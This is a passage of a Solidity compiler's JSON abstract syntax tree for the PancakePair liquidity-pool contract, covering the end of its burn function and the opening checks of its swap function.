														"argumentTypes": null,
														"id": 1279,
														"name": "balance0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1191,
														"src": "8889:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1285,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2475,
																		"src": "8934:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_PancakePair_$1700",
																			"typeString": "contract PancakePair"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_PancakePair_$1700",
																			"typeString": "contract PancakePair"
																		}
																	],
																	"id": 1284,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "8926:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 1286,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8926:13:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1281,
																		"name": "_token0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1183,
																		"src": "8907:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 1280,
																	"name": "IERC20",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1784,
																	"src": "8900:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																		"typeString": "type(contract IERC20)"
																	}
																},
																"id": 1282,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8900:15:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_IERC20_$1784",
																	"typeString": "contract IERC20"
																}
															},
															"id": 1283,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balanceOf",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 1745,
															"src": "8900:25:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																"typeString": "function (address) view external returns (uint256)"
															}
														},
														"id": 1287,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "8900:40:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8889:51:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1289,
												"nodeType": "ExpressionStatement",
												"src": "8889:51:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1299,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1290,
														"name": "balance1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1202,
														"src": "8950:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1296,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2475,
																		"src": "8995:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_PancakePair_$1700",
																			"typeString": "contract PancakePair"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_PancakePair_$1700",
																			"typeString": "contract PancakePair"
																		}
																	],
																	"id": 1295,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "8987:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 1297,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8987:13:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1292,
																		"name": "_token1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1187,
																		"src": "8968:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 1291,
																	"name": "IERC20",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1784,
																	"src": "8961:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																		"typeString": "type(contract IERC20)"
																	}
																},
																"id": 1293,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8961:15:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_IERC20_$1784",
																	"typeString": "contract IERC20"
																}
															},
															"id": 1294,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balanceOf",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 1745,
															"src": "8961:25:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																"typeString": "function (address) view external returns (uint256)"
															}
														},
														"id": 1298,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "8961:40:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8950:51:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1300,
												"nodeType": "ExpressionStatement",
												"src": "8950:51:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1302,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1191,
															"src": "9020:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1303,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1202,
															"src": "9030:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1304,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1176,
															"src": "9040:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1305,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1178,
															"src": "9051:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1301,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 762,
														"src": "9012:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 1306,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9012:49:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1307,
												"nodeType": "ExpressionStatement",
												"src": "9012:49:1"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1308,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1221,
													"src": "9075:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1318,
												"nodeType": "IfStatement",
												"src": "9071:47:1",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 1316,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1309,
															"name": "kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 491,
															"src": "9082:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1314,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 483,
																	"src": "9109:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1311,
																			"name": "reserve0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 481,
																			"src": "9095:8:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		],
																		"id": 1310,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "9090:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 1312,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "9090:14:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1313,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2385,
																"src": "9090:18:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1315,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "9090:28:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "9082:36:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1317,
													"nodeType": "ExpressionStatement",
													"src": "9082:36:1"
												}
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 1320,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2443,
																"src": "9178:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1321,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "9178:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 1322,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1171,
															"src": "9190:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1323,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1173,
															"src": "9199:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1324,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1166,
															"src": "9208:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 1319,
														"name": "Burn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															595
														],
														"referencedDeclaration": 595,
														"src": "9173:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
															"typeString": "function (address,uint256,uint256,address)"
														}
													},
													"id": 1325,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9173:38:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1326,
												"nodeType": "EmitStatement",
												"src": "9168:43:1"
											}
										]
									},
									"documentation": null,
									"id": 1328,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1169,
											"modifierName": {
												"argumentTypes": null,
												"id": 1168,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 513,
												"src": "7838:4:1",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "7838:4:1"
										}
									],
									"name": "burn",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1167,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1166,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1328,
												"src": "7812:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1165,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "7812:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7802:26:1"
									},
									"returnParameters": {
										"id": 1174,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1171,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 1328,
												"src": "7852:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1170,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "7852:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1173,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 1328,
												"src": "7866:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1172,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "7866:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7851:28:1"
									},
									"scope": 1700,
									"src": "7789:1429:1",
									"stateMutability": "nonpayable",
									"superFunction": 2206,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1623,
										"nodeType": "Block",
										"src": "11853:2720:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1348,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1344,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1342,
																	"name": "amount0Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1330,
																	"src": "11884:10:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1343,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "11897:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "11884:14:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1347,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1345,
																	"name": "amount1Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1332,
																	"src": "11902:10:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1346,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "11915:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "11902:14:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "11884:32:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54",
															"id": 1349,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "11930:37:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\""
															},
															"value": "Pancake: INSUFFICIENT_OUTPUT_AMOUNT"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\""
															}
														],
														"id": 1341,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "11863:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1350,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "11863:114:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1351,
												"nodeType": "ExpressionStatement",
												"src": "11863:114:1"
											},
											{
												"assignments": [
													1353,
													1355,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1353,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 1623,
														"src": "11988:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1352,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "11988:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1355,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 1623,
														"src": "12007:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1354,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "12007:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1358,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1356,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 535,
														"src": "12030:11:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1357,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12030:13:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11987:56:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1366,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1362,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1360,
																	"name": "amount0Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1330,
																	"src": "12089:10:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 1361,
																	"name": "_reserve0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1353,
																	"src": "12102:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "12089:22:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1365,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1363,
																	"name": "amount1Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1332,
																	"src": "12115:10:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 1364,
																	"name": "_reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1355,
																	"src": "12128:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "12115:22:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "12089:48:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4c4951554944495459",
															"id": 1367,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "12151:33:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_410624995b1b083dcf6f8603df497c85feb7b93fc33473e1167ca929c6d9b9e6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY\""
															},
															"value": "Pancake: INSUFFICIENT_LIQUIDITY"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_410624995b1b083dcf6f8603df497c85feb7b93fc33473e1167ca929c6d9b9e6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY\""
															}
														],
														"id": 1359,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "12068:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1368,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12068:126:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1369,
												"nodeType": "ExpressionStatement",
												"src": "12068:126:1"
											},
											{
												"assignments": [
													1371
												],
												"declarations": [
													{
														"constant": false,
														"id": 1371,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 1623,
														"src": "12205:13:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1370,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12205:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1372,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "12205:13:1"
											},
											{
												"assignments": [
													1374
												],
												"declarations": [
													{
														"constant": false,
														"id": 1374,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 1623,
														"src": "12228:13:1",
														"stateVariable": false,
